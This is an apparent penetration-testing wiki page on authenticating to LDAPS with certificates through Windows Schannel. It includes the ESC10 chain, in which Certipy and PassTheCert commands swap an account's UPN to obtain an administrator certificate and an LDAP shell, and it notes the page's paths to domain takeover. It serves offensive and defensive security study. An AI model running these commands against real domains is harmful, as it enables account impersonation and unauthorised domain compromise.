---
title: "Schannel: authenticating with a certificate over TLS"
description: "Using a certificate to authenticate through Windows Schannel (TLS) to LDAPS instead of Kerberos PKINIT, the path that matters when PKINIT is unavailable or when weak Schannel certificate mapping (ESC10) lets a certificate impersonate another account."
keywords:
  - Schannel
  - PassTheCert
  - LDAPS
  - ESC10
  - certificate mapping
---

# Schannel

PKINIT is the Kerberos way to turn a [certificate](theft-and-pass-the-certificate.md) into access, but it is not the only one. **Schannel** is the Windows TLS provider, and it performs **certificate-based client authentication** for TLS services, most usefully **LDAPS**. So a certificate you hold or forged can be presented over an LDAPS/TLS handshake to authenticate as its subject, with no Kerberos involved. That matters in two cases: when **PKINIT is unavailable** (no DC KDC certificate, or PKINIT blocked), and when **Schannel's certificate mapping is weak** ([ESC10](certificate-mapping.md)).

## Authenticating over Schannel

```bash
# Certipy: authenticate with a PFX to LDAPS via Schannel (not PKINIT) and get an LDAP shell
certipy auth -pfx victim.pfx -ldap-shell -dc-ip <dc>

# PassTheCert: authenticate to LDAP/S with a certificate through Schannel, then act over LDAP
passthecert.py -action ldap-shell -crt victim.crt -key victim.key -domain example.local -dc-ip <dc>
```

From an LDAP shell you perform the usual directory writes as the authenticated principal: set RBCD, add a computer, grant DCSync, or reset a password.

## The ESC10 angle

ESC10 is **weak Schannel certificate mapping**: on the server performing Schannel auth (a DC for LDAPS), the `CertificateMappingMethods` registry value includes UPN mapping (bit `0x4`), so a certificate is matched to an account by its **UPN** rather than the strong SID binding. The path needs control of an **enrollable intermediary account**: set that account's `userPrincipalName` to the target's, enroll a certificate while the UPN matches, revert the UPN, then authenticate as the target **over Schannel** (where PKINIT would be refused):

```bash
# Point the intermediary's UPN at the target, enroll, then revert the UPN
certipy account update -user puppet -upn administrator@example.local -dc-ip <dc>
certipy req -ca <CA> -template User -username puppet@example.local -password <pw>
certipy account update -user puppet -upn puppet@example.local -dc-ip <dc>
# Authenticate over Schannel, because the weak UPN mapping only applies there
certipy auth -pfx administrator.pfx -ldap-shell -dc-ip <dc>
```

This is the UPN-based ESC10 chain; writing a target's `altSecurityIdentities` is a different, explicit-mapping path, not a prerequisite here.

## Exploitation notes

- Schannel is the **fallback that keeps certificate access working** where PKINIT does not, so reach for `-ldap-shell` / PassTheCert when `certipy auth` over PKINIT fails.
- ESC10 is specifically a **Schannel** mapping weakness, so the impersonation only works over Schannel/LDAPS, not Kerberos; that is why the tooling forces the LDAPS path.
- LDAPS **channel binding (EPA)** governs whether a relayed authentication reaches Schannel LDAPS; it is the same control that bounds [NTLM relay](../ntlm/relay.md) to LDAPS.
- An LDAP shell is enough for domain takeover (RBCD, DCSync grant), so Schannel access to LDAPS as a privileged principal is as good as PKINIT.

## Tools

- **Certipy** (`auth -ldap-shell`): Schannel LDAPS authentication with a PFX.
- **PassTheCert** (AlmondOffSec): authenticate to LDAP/S with a certificate through Schannel.

## References

- [PassTheCert (AlmondOffSec)](https://github.com/AlmondOffSec/PassTheCert)
- [SpecterOps: ESC10, Schannel weak certificate mapping](https://docs.specterops.io/ghostpack-docs/Certify.wik-mdx/esc10-schannel-weak-certificate-mapping)
- [HackTricks: AD CS domain escalation (ESC10/Schannel)](https://hacktricks.wiki/en/windows-hardening/active-directory-methodology/ad-certificates/domain-escalation.html)
